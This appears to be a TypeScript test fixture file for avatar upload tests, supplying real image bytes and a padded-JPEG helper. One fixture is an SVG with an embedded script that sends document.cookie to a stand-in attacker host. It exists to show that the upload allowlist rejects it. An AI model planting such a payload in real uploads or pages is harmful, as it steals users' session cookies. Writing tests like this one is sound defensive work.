/**
 * Real image bytes for the avatar suites.
 *
 * Genuine files rather than synthesised headers: the upload path sniffs magic
 * bytes and the download path is asserted to return the *same* bytes, so a
 * fixture that only looked like a JPEG for the first three octets would let a
 * broken round trip pass.
 *
 * Kept out of `support/index.js` so that two agents adding helpers at the same
 * time do not collide on one barrel file; import it directly.
 */

/** A 1×1 baseline JPEG. */
export const JPEG_1X1 = Buffer.from(
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a' +
    'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA' +
    'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==',
  'base64',
);

/** A 1×1 PNG. Used as the "renamed file" fixture: declared JPEG, actually this. */
export const PNG_1X1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

/** A 1×1 lossy WebP, in the RIFF container the sniffer identifies. */
export const WEBP_1X1 = Buffer.from(
  'UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAgA0JaQAA3AA/vuUAAA=',
  'base64',
);

/**
 * An SVG carrying a script element — the exact payload the allowlist exists for.
 *
 * Served from the API's origin with `Content-Type: image/svg+xml`, this would
 * execute in the context of every colleague who opened the directory.
 */
export const SVG_WITH_SCRIPT = Buffer.from(
  '<?xml version="1.0"?>\n' +
    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">' +
    '<script>fetch("https://attacker.example/"+document.cookie)</script>' +
    '</svg>\n',
  'utf8',
);

/**
 * A JPEG of at least `bytes` total length.
 *
 * The real signature is preserved so the size check is proved to bite *before*
 * the format check — an oversized payload that was also not an image would pass
 * the test for the wrong reason.
 */
export function oversizedJpeg(bytes: number): Buffer {
  return Buffer.concat([JPEG_1X1, Buffer.alloc(Math.max(0, bytes - JPEG_1X1.length), 0x20)]);
}
